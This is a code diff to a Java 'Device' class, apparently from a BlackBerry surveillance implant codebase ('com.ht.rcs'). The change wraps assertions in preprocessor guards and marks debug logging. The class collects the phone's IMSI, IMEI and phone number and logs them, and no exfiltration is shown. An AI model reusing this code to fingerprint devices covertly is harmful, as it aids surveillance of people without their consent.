@@ -26,7 +26,7 @@ import com.ht.rcs.blackberry.utils.WChar;
  */
 public final class Device implements Singleton {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
 
     public static final int VERSION = 2010033101;
@@ -64,7 +64,9 @@ public final class Device implements Singleton {
 
     public static byte[] getVersion() {
         byte[] versionRet = Utils.intToByteArray(VERSION);
-        Check.ensures(versionRet.length == 4, "Wrong version len");
+        // #ifdef DBC
+//@        Check.ensures(versionRet.length == 4, "Wrong version len");
+        // #endif
         return versionRet;
     }
 
@@ -81,13 +83,17 @@ public final class Device implements Singleton {
      */
     public byte[] getWImei() {
 
-        Check.ensures(imei != null, "null imei");
+        // #ifdef DBC
+//@        Check.ensures(imei != null, "null imei");
+        // #endif
         return WChar.getBytes(Utils.imeiToString(imei));
     }
-    
+
     public String getImei() {
 
-        Check.ensures(imei != null, "null imei");
+        // #ifdef DBC
+//@        Check.ensures(imei != null, "null imei");
+        // #endif
         return Utils.imeiToString(imei);
     }
 
@@ -99,7 +105,7 @@ public final class Device implements Singleton {
     public byte[] getWImsi() {
         return WChar.getBytes(Utils.imeiToString(imsi));
     }
-    
+
     public String getImsi() {
         return Utils.imeiToString(imsi);
     }
@@ -110,13 +116,17 @@ public final class Device implements Singleton {
      * @return the phone number
      */
     public byte[] getWPhoneNumber() {
-        Check.ensures(phoneNumber != null, "null phoneNumber");
+        // #ifdef DBC
+//@        Check.ensures(phoneNumber != null, "null phoneNumber");
+        // #endif
         byte[] encoded = WChar.getBytes(phoneNumber);
         return encoded;
     }
-    
+
     public String getPhoneNumber() {
-        Check.ensures(phoneNumber != null, "null phoneNumber");
+        // #ifdef DBC
+//@        Check.ensures(phoneNumber != null, "null phoneNumber");
+        // #endif
         return phoneNumber;
     }
 
@@ -135,18 +145,22 @@ public final class Device implements Singleton {
 
         try {
             imsi = SIMCardInfo.getIMSI();
+            // #debug
             debug.info("IMSI: " + Utils.imeiToString(imsi));
         } catch (SIMCardException e) {
+            // #debug
             debug.warn("no sim detected");
         }
 
         imei = GPRSInfo.getIMEI();
+        // #debug
         debug.info("IMSE: " + Utils.imeiToString(imsi));
 
         phoneNumber = Phone.getDevicePhoneNumber(true);
         if (phoneNumber == null) {
             phoneNumber = "";
         }
+        // #debug
         debug.info("Phone Number: " + phoneNumber);
     }
 
